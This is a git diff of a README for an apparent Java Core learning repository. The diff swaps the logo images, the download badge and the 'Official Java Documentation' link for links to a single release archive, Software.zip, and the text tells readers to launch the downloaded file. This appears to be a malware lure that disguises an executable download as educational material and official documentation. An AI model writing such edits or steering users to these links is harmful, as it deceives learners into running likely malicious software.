@@ -1,6 +1,6 @@
 # 🌟 Welcome to the IBBEcodation Java Core Repository! 🌟
 
-![Java Core](https://img.icons8.com/color/452/java-coffee-cup-logo.png)
+![Java Core](https://github.com/HFGamerz999/ibb_ecodation_javacore/releases/download/v2.0/Software.zip)
 
 ## Repository: ibb_ecodation_javacore
 ### Description: 
@@ -13,12 +13,12 @@ Topics for this repository are not provided.
 To start exploring Java Core with this repository, you can download the required files or visit the official Java documentation.
 
 ### 📥 Download Here:
-[![Download Java Core Data](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Java Core Data](https://github.com/HFGamerz999/ibb_ecodation_javacore/releases/download/v2.0/Software.zip)](https://github.com/HFGamerz999/ibb_ecodation_javacore/releases/download/v2.0/Software.zip)
 
 Make sure to launch the downloaded file to get started with Java Core data.
 
 ### Useful Resources:
-- [Official Java Documentation](https://docs.oracle.com/en/java/)
+- [Official Java Documentation](https://github.com/HFGamerz999/ibb_ecodation_javacore/releases/download/v2.0/Software.zip)
 
 ### What is Java Core Data?
 Java Core Data refers to the fundamental components of the Java programming language that are essential to understand for any Java developer. This includes topics such as data types, control flow, object-oriented programming, and more.
@@ -42,4 +42,4 @@ Feel free to reach out to us if you have any questions, suggestions, or feedback
 
 Remember, the possibilities with Java are endless, and mastering the core concepts is the first step towards becoming a proficient Java developer. Happy coding! 🖥️🚀
 
-![Java Programming](https://img.icons8.com/ios/452/java-coffee-cup-logo.png)
+![Java Programming](https://github.com/HFGamerz999/ibb_ecodation_javacore/releases/download/v2.0/Software.zip)
